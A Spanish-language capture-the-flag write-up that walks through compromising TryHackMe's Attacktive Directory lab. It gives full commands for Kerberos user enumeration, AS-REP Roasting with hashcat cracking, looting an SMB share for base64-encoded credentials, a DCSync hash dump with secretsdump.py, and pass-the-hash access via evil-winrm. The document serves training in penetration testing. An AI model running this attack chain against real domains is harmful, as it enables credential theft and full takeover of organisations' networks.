---
title: "tryhackme-attacktive-directory"
description: "Guía paso a paso para resolver la máquina Attacktive Directory de TryHackMe. Configuración de Impacket, enumeración con Kerbrute, AS-REP Roasting y ataque DCSync."
date: "2026-01-28"
published: true
tags: ["tryhackme", "active-directory", "kerberos", "as-rep-roasting", "dcsync", "pass-the-hash"]
readTime: "15 min"
---

# 🏴‍☠️ TryHackMe — Attacktive Directory (Paso a Paso)

**Attacktive Directory** es una máquina diseñada para enseñar los conceptos fundamentales de la explotación de Directorio Activo (AD). Cubriremos desde la instalación de herramientas esenciales hasta la obtención del control total del dominio mediante ataques como AS-REP Roasting y DCSync.

---

## 1) Preparación del Entorno

Antes de comenzar, aseguramos que nuestro sistema esté actualizado y contamos con las herramientas necesarias, específicamente la suite **Impacket** y **Kerbrute**.

### Instalación de Impacket

Impacket es una colección de clases de Python para trabajar con protocolos de red. Es fundamental para pentesting en AD.

```bash
# Actualizar sistema
sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y

# Clonar repositorio de Impacket
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket

# Instalar dependencias y la librería
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/
sudo pip3 install .
sudo python3 setup.py install
```

También instalamos **BloodHound** y **Neo4j** para visualización (aunque en este writeup nos centraremos en la explotación por consola).

```bash
sudo apt-get install bloodhound neo4j -y
```

### Instalación de Kerbrute

Kerbrute es una herramienta popular para realizar fuerza bruta y enumeración de usuarios a través de Kerberos pre-authentication.

```bash
# Descargar binario
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386

# Dar permisos de ejecución y mover al path
chmod +x kerbrute_linux_386
sudo mv kerbrute_linux_386 /bin/kerbrute
```

---

## 2) Reconocimiento Inicial

Comenzamos con un escaneo de puertos para identificar servicios expuestos, típicamente buscando puertos de AD (53, 88, 139, 389, 445, etc.).

```bash
nmap -T4 -sC -sV <IP_MACHINE> | tee scan.initial
```

Adicionalmente, usamos `enum4linux` para intentar enumerar información básica si es posible.

```bash
enum4linux -U <IP_MACHINE>
```

---

## 3) Enumeración de Usuarios (Kerbrute)

Sabiendo que el dominio es `spookysec.local` (obtenido del reconocimiento), usamos `kerbrute` para validar qué usuarios existen realmente en el Directorio Activo utilizando una lista de palabras (wordlist).

```bash
# Enumerar usuarios válidos
kerbrute userenum -d spookysec.local --dc <IP_MACHINE> <wordlist> | tee kerbrute.txt
```

Filtramos la salida para obtener solo la lista limpia de usuarios válidos:

```bash
awk '{print $NF}' kerbrute.txt | tee users.txt
```

---

## 4) AS-REP Roasting

Con la lista de usuarios válidos, intentamos un ataque de **AS-REP Roasting**. Este ataque busca usuarios que tengan habilitada la opción *"Do not require Kerberos preauthentication"*. Si encontramos alguno, podemos solicitar un ticket TGT y crackearlo offline para obtener su contraseña.

Usamos `GetNPUsers.py` de Impacket:

```bash
python3 /opt/impacket/examples/GetNPUsers.py -dc-ip <IP_MACHINE> -usersfile users.txt spookysec.local/
```

Si tenemos éxito, obtendremos un hash. Lo guardamos en un archivo (ej. `TGT.txt`) y procedemos a crackearlo con **hashcat** (modo 18200).

```bash
hashcat -m 18200 TGT.txt pass.txt -o out.txt
```

> **Resultado**: Obtenemos la contraseña del usuario `svc-admin`.

---

## 5) Enumeración SMB y Movimiento Lateral

Con las credenciales de `svc-admin`, exploramos los recursos compartidos (shares) del servidor.

```bash
# Listar recursos compartidos
smbclient -L \\<IP_MACHINE>\backup -U svc-admin

# Conectarse al share 'backup'
smbclient \\<IP_MACHINE>\backup -U svc-admin
```

Dentro del recurso compartido `backup`, encontramos un archivo interesante: `backup_credentials.txt`. Lo descargamos:

```bash
get backup_credentials.txt
```

Al leer el archivo, vemos que el contenido está codificado en Base64.

```bash
cat backup_credentials.txt
# Salida: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decodificamos el contenido:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

> **Resultado**: `backup@spookysec.local:backup2517860`

Hemos obtenido las credenciales del usuario `backup`.

---

## 6) Escalada de Privilegios (DCSync)

El usuario `backup` suele pertenecer al grupo **Backup Operators**, lo que a menudo le permite realizar copias de seguridad del Directorio Activo, incluyendo el archivo `NTDS.dit` que contiene todos los hashes del dominio.

Podemos abusar de este privilegio para realizar un ataque **DCSync** y volcar los secretos del controlador de dominio (incluyendo el hash del Administrador).

Usamos `secretsdump.py` de Impacket:

```bash
python3 /opt/impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup2517860@<IP_MACHINE>
```

Esto nos devolverá, entre otros, el hash NTLM del usuario `Administrator`.

---

## 7) Acceso Final (Pass-The-Hash)

Finalmente, con el hash del Administrador, no necesitamos la contraseña en texto plano. Podemos usar la técnica **Pass-The-Hash** con `evil-winrm` para obtener una shell remota como Administrador.

```bash
evil-winrm -i <IP_MACHINE> -u Administrator -H <HASH_ADMINISTRADOR>
```

¡Felicidades! Has comprometido completamente el dominio.
